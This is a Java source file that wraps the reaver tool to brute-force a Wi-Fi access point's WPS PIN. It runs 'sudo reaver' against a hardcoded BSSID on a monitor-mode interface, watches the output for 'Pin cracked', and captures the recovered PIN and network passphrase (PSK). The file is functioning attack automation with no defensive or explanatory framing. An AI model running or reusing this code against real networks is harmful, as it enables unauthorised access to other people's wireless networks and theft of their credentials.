package comunication;

import accessPoint.AccessPoint;
import adapter.Adapter;
import adapter.WifiAdapter;

import java.awt.event.KeyEvent;
import java.io.*;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by georgipavlov on 18.03.16.
 */
public class StateProducer  {
    private String BSSID;
    private String SSID;
    private String ch;
    private String MON_X;
    private AccessPoint currentAP;
    private Adapter adapter;
    private String COMMAND;
    private String EXIT_REAVER = "^C";
    private String PSK;
    private String PIN;
    private List<AccessPoint> APs;


    public StateProducer(List<AccessPoint> accessPoints , Adapter adapter){
        this.currentAP = accessPoints.get(0);
        this.adapter = adapter;
        this.APs = accessPoints;
        initRaever();
    }

    public  void initRaever(){
        BSSID = currentAP.getBssid();
        SSID = currentAP.getEssid();
        ch = currentAP.getChanel();
        MON_X = adapter.getInterface();
        COMMAND = "sudo reaver -i " + MON_X +" -b " + BSSID +  " -vv";
    }

    public StatePakage startReaver() throws IOException {
       Process p = Runtime.getRuntime().exec(COMMAND);
        BufferedWriter writer =
                new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
        writer.write("\n");
        //writer.write("\n");
        writer.flush();


        BufferedReader reader =
                new BufferedReader(new InputStreamReader(p.getInputStream()));

        String line = null;
        int resultValue;
        while (true){
            line = reader.readLine();
            System.out.println(line);
           if(line.contains("WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking")){
               resultValue=1;
               break;
           }else if(line.contains("Pin cracked")){
               resultValue=2;
               PIN = reader.readLine();
               PSK = reader.readLine();
               break;
           }
        }
        writer.write(EXIT_REAVER);
       // writer.close();
       // reader.close();
        p.destroy();



        switch (resultValue){
            case 1:{
                return new StatePakage(StatePakage.State.BLOKED,null,null,adapter,APs);
            }case 2:{
                return new StatePakage(StatePakage.State.FINISHED,PIN,PSK,adapter,APs);
            }
        }
        p.destroy();
        return null;
    }


    public static void main(String[] args) {
        List<AccessPoint> ap = new ArrayList<>();
        ap.add(new AccessPoint("F8:D1:11:41:B5:08" ,"11" , "CCMP" , "519" ));
        Adapter adapter1 = new WifiAdapter("mon23" , null,null);
        StateProducer stateProducer = new StateProducer(ap , adapter1);
        try {
            stateProducer.startReaver();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


}
